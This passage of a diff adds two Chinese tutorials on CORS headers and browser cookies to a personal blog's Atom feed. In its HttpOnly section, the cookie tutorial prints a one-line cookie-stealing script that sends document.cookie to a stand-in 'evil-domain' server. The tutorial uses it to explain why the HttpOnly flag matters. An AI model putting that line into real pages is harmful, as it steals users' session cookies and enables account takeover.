+<p>如果<code>Origin</code>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
+<pre><code class="language-http4">Access-Control-Allow-Origin: http://api.bob.com
+Access-Control-Allow-Credentials: true
+Access-Control-Expose-Headers: FooBar
+Content-Type: text/html; charset=utf-8
+</code></pre>
+<p>上面的头信息之中，有三个与 CORS 请求相关的字段，都以<code>Access-Control-</code>开头。</p>
+<p><strong>（1）<code>Access-Control-Allow-Origin</code></strong></p>
+<p>该字段是必须的。它的值要么是请求时<code>Origin</code>字段的值，要么是一个<code>*</code>，表示接受任意域名的请求。</p>
+<p><strong>（2）<code>Access-Control-Allow-Credentials</code></strong></p>
+<p>该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为<code>true</code>，即表示服务器明确许可，浏览器可以把 Cookie 包含在请求中，一起发给服务器。这个值也只能设为<code>true</code>，如果服务器不要浏览器发送 Cookie，不发送该字段即可。</p>
+<p><strong>（3）<code>Access-Control-Expose-Headers</code></strong></p>
+<p>该字段可选。CORS 请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个服务器返回的基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader('FooBar')</code>可以返回<code>FooBar</code>字段的值。</p>
+<h3 id="32-withcredentials-属性">3.2 withCredentials 属性</h3>
+<p>上面说到，CORS 请求默认不包含 Cookie 信息（以及 HTTP 认证信息等）。如果需要包含 Cookie 信息，一方面要服务器同意，指定<code>Access-Control-Allow-Credentials</code>字段。</p>
+<pre><code class="language-http">Access-Control-Allow-Credentials: true
+</code></pre>
+<p>另一方面，开发者必须在 AJAX 请求中打开<code>withCredentials</code>属性。</p>
+<pre><code class="language-http">var xhr = new XMLHttpRequest();
+xhr.withCredentials = true;
+</code></pre>
+<p>否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。</p>
+<p>但是，如果省略<code>withCredentials</code>设置，有的浏览器还是会一起发送 Cookie。这时，可以显式关闭<code>withCredentials</code>。</p>
+<pre><code class="language-http">xhr.withCredentials = false;
+</code></pre>
+<p>需要注意的是，如果要发送 Cookie，<code>Access-Control-Allow-Origin</code>就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨域）原网页代码中的<code>document.cookie</code>也无法读取服务器域名下的 Cookie。</p>
+<h2 id="4-非简单请求">4. 非简单请求</h2>
+<h3 id="41-预检请求">4.1 预检请求</h3>
+<p>非简单请求是那种对服务器提出特殊要求的请求，比如请求方法是<code>PUT</code>或<code>DELETE</code>，或者<code>Content-Type</code>字段的类型是<code>application/json</code>。</p>
+<p>非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为“预检”请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的<code>XMLHttpRequest</code>请求，否则就报错。这是为了防止这些新增的请求，对传统的没有 CORS 支持的服务器形成压力，给服务器一个提前拒绝的机会，这样可以防止服务器大量收到<code>DELETE</code>和<code>PUT</code>请求，这些传统的表单不可能跨域发出的请求。</p>
+<p>下面是一段浏览器的 JavaScript 脚本。</p>
+<pre><code class="language-http">var url = 'http://api.alice.com/cors';
+var xhr = new XMLHttpRequest();
+xhr.open('PUT', url, true);
+xhr.setRequestHeader('X-Custom-Header', 'value');
+xhr.send();
+</code></pre>
+<p>上面代码中，HTTP 请求的方法是<code>PUT</code>，并且发送一个自定义头信息<code>X-Custom-Header</code>。</p>
+<p>浏览器发现，这是一个非简单请求，就自动发出一个“预检”请求，要求服务器确认可以这样请求。下面是这个“预检”请求的 HTTP 头信息。</p>
+<pre><code class="language-http">OPTIONS /cors HTTP/1.1
+Origin: http://api.bob.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: X-Custom-Header
+Host: api.alice.com
+Accept-Language: en-US
+Connection: keep-alive
+User-Agent: Mozilla/5.0...
+</code></pre>
+<p>“预检”请求用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。头信息里面，关键字段是<code>Origin</code>，表示请求来自哪个源。</p>
+<p>除了<code>Origin</code>字段，“预检”请求的头信息包括两个特殊字段。</p>
+<p><strong>（1）<code>Access-Control-Request-Method</code></strong></p>
+<p>该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是<code>PUT</code>。</p>
+<p><strong>（2）<code>Access-Control-Request-Headers</code></strong></p>
+<p>该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p>
+<h3 id="42-预检请求的回应">4.2 预检请求的回应</h3>
+<p>服务器收到“预检”请求以后，检查了<code>Origin</code>、<code>Access-Control-Request-Method</code>和<code>Access-Control-Request-Headers</code>字段以后，确认允许跨源请求，就可以做出回应。</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Date: Mon, 01 Dec 2008 01:15:39 GMT
+Server: Apache/2.0.61 (Unix)
+Access-Control-Allow-Origin: http://api.bob.com
+Access-Control-Allow-Methods: GET, POST, PUT
+Access-Control-Allow-Headers: X-Custom-Header
+Content-Type: text/html; charset=utf-8
+Content-Encoding: gzip
+Content-Length: 0
+Keep-Alive: timeout=2, max=100
+Connection: Keep-Alive
+Content-Type: text/plain
+</code></pre>
+<p>上面的 HTTP 回应中，关键的是<code>Access-Control-Allow-Origin</code>字段，表示<code>http://api.bob.com</code>可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
+<pre><code class="language-http">Access-Control-Allow-Origin: *
+</code></pre>
+<p>如果服务器否定了“预检”请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段，或者明确表示请求不符合条件。</p>
+<pre><code class="language-http">OPTIONS http://api.bob.com HTTP/1.1Status: 200Access-Control-Allow-Origin: https://notyourdomain.comAccess-Control-Allow-Method: POST
+</code></pre>
+<p>上面的服务器回应，<code>Access-Control-Allow-Origin</code>字段明确不包括发出请求的<code>http://api.bob.com</code>。</p>
+<p>这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpRequest</code>对象的<code>onerror</code>回调函数捕获。控制台会打印出如下的报错信息。</p>
+<pre><code class="language-http">XMLHttpRequest cannot load http://api.alice.com.Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
+</code></pre>
+<p>服务器回应的其他 CORS 相关字段如下。</p>
+<pre><code class="language-http">Access-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderAccess-Control-Allow-Credentials: trueAccess-Control-Max-Age: 1728000
+</code></pre>
+<p><strong>（1）<code>Access-Control-Allow-Methods</code></strong></p>
+<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次“预检”请求。</p>
+<p><strong>（2）<code>Access-Control-Allow-Headers</code></strong></p>
+<p>如果浏览器请求包括<code>Access-Control-Request-Headers</code>字段，则<code>Access-Control-Allow-Headers</code>字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在“预检”中请求的字段。</p>
+<p><strong>（3）<code>Access-Control-Allow-Credentials</code></strong></p>
+<p>该字段与简单请求时的含义相同。</p>
+<p><strong>（4）<code>Access-Control-Max-Age</code></strong></p>
+<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
+<h3 id="43-浏览器的正常请求和回应">4.3 浏览器的正常请求和回应</h3>
+<p>一旦服务器通过了“预检”请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个<code>Origin</code>头信息字段。服务器的回应，也都会有一个<code>Access-Control-Allow-Origin</code>头信息字段。</p>
+<p>下面是“预检”请求之后，浏览器的正常 CORS 请求。</p>
+<pre><code class="language-http">PUT /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comX-Custom-Header: valueAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0...
+</code></pre>
+<p>上面头信息的<code>Origin</code>字段是浏览器自动添加的。</p>
+<p>下面是服务器正常的回应。</p>
+<pre><code class="language-http">Access-Control-Allow-Origin: http://api.bob.comContent-Type: text/html; charset=utf-8
+</code></pre>
+<p>上面头信息中，<code>Access-Control-Allow-Origin</code>字段是每次回应都必定包含的。</p>
+<h2 id="5-与-jsonp-的比较">5. 与 JSONP 的比较</h2>
+<p>CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。JSONP 只支持<code>GET</code>请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。</p>
+<p>注: 本文来自 http://javascript.ruanyifeng.com/bom/cors.html</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Cookie]]></title>
+        <id>https://LiHaoGo.github.io/post/index/</id>
+        <link href="https://LiHaoGo.github.io/post/index/">
+        </link>
+        <updated>2019-01-25T11:09:48.000Z</updated>
+        <summary type="html"><![CDATA[<p>Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>
+<!-- more -->
+<h1 id="cookie"><strong>Cookie</strong></h1>
+<h2 id="1-概述">1. 概述</h2>
+<p>Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>
+<p>Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。</p>
+<ul>
+<li>对话（session）管理：保存登录、购物车等需要记录的信息。</li>
+<li>个性化：保存用户的偏好，比如网页的字体大小、背景色等等。</li>
+<li>追踪：记录和分析用户行为。</li>
+</ul>
+<p>有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。</p>
+<p>Cookie 包含以下几方面的信息。</p>
+<ul>
+<li>Cookie 的名字</li>
+<li>Cookie 的值（真正的数据写在这里面）</li>
+<li>到期时间</li>
+<li>所属域名（默认是当前域名）</li>
+<li>生效的路径（默认是当前网址）</li>
+</ul>
+<p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含<code>www.example.com</code>这个域名，以及根路径<code>/</code>。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。</p>
+<p>浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p>
+<pre><code>// 浏览器是否打开 Cookie 功能
+window.navigator.cookieEnabled // true
+</code></pre>
+<p><code>document.cookie</code>属性返回当前网页的 Cookie。</p>
+<pre><code>// 当前网页的 Cookie
+document.cookie
+</code></pre>
+<p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p>
+<p>浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>读取。</p>
+<h2 id="2-cookie-与-http-协议">2. Cookie 与 HTTP 协议</h2>
+<p>Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。</p>
+<h3 id="21-http-回应cookie-的生成">2.1 .HTTP 回应：Cookie 的生成</h3>
+<p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p>
+<pre><code class="language-http">Set-Cookie:foo=bar
+</code></pre>
+<p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p>
+<p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p>
+<pre><code class="language-http">HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[page content]
+</code></pre>
+<p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p>
+<pre><code class="language-http">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly
+</code></pre>
+<p>上面的几个属性的含义，将在后文解释。</p>
+<p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p>
+<pre><code class="language-http">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly
+</code></pre>
+<p>下面是一个例子。</p>
+<pre><code class="language-http">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+</code></pre>
+<p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p>
+<pre><code class="language-http">Set-Cookie: key1=value1; domain=example.com; path=/blog
+</code></pre>
+<p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p>
+<pre><code class="language-http">Set-Cookie: key1=value2; domain=example.com; path=/blog
+</code></pre>
+<p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p>
+<pre><code class="language-http">Set-Cookie: key1=value2; domain=example.com; path=/
+</code></pre>
+<p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p>
+<pre><code class="language-http">Cookie: key1=value1; key1=value2
+</code></pre>
+<p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p>
+<h3 id="22-http-请求cookie-的发送">2.2 HTTP 请求：Cookie 的发送</h3>
+<p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p>
+<pre><code class="language-http">Cookie: foo=bar
+</code></pre>
+<p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p>
+<p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p>
+<pre><code class="language-http">Cookie: name=value; name2=value2; name3=value3
+</code></pre>
+<p>下面是一个例子。</p>
+<pre><code class="language-http">GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry
+</code></pre>
+<p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p>
+<ul>
+<li>Cookie 的各种属性，比如何时过期。</li>
+<li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li>
+</ul>
+<h2 id="3-cookie-的属性">3. Cookie 的属性</h2>
+<h3 id="31-expiresmax-age">3.1 Expires，Max-Age</h3>
+<p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p>
+<pre><code class="language-http">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+</code></pre>
+<p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p>
+<p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p>
+<p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p>
+<p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p>
+<h3 id="32-domainpath">3.2 Domain，Path</h3>
+<p><code>Domain</code>属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如<code>www.example.com</code>会设为<code>example.com</code>，而且以后如果访问<code>example.com</code>的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在<code>Set-Cookie</code>字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。</p>
+<p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>PATH</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是域名必须一致。</p>
+<h3 id="33-securehttponly">3.3 Secure，HttpOnly</h3>
+<p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p>
+<p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>Document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p>
+<pre><code class="language-js">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;
+</code></pre>
+<p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p>
+<h2 id="4-documentcookie">4. document.cookie</h2>
+<p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p>
+<p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p>
+<pre><code class="language-js">document.cookie // &quot;foo=bar;baz=bar&quot;
+</code></pre>
+<p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p>
+<pre><code class="language-js">var cookies = document.cookie.split(';');for (var i = 0; i &lt; cookies.length; i++) {  console.log(cookies[i]);}// foo=bar// baz=bar
+</code></pre>
+<p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p>
+<pre><code class="language-js">document.cookie = 'fontSize=14';
+</code></pre>
+<p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p>
+<p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p>
+<pre><code class="language-js">document.cookie = 'test1=hello';document.cookie = 'test2=world';document.cookie// test1=hello;test2=world
+</code></pre>
+<p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p>
+<p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p>
+<pre><code class="language-js">document.cookie = &quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;;
+</code></pre>
+<p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p>
+<p>各个属性的写入注意点如下。</p>
+<ul>
+<li><code>path</code>属性必须为绝对路径，默认为当前路径。</li>
+<li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li>
+<li><code>max-age</code>属性的值为秒数。</li>
+<li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li>
+</ul>
+<p><code>document.cookie</code>写入 Cookie 的例子如下。</p>
+<pre><code class="language-js">document.cookie = 'fontSize=14; '  + 'expires=' + someDate.toGMTString() + '; '  + 'path=/subdirectory; '  + 'domain=*.example.com';
+</code></pre>
+<p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p>
+<p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p>
+<pre><code class="language-js">document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
+</code></pre>
+<p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p>
+<p>注: 本文来源 http://javascript.ruanyifeng.com/bom/cookie.html</p>
+]]></content>
+    </entry>
 </feed>
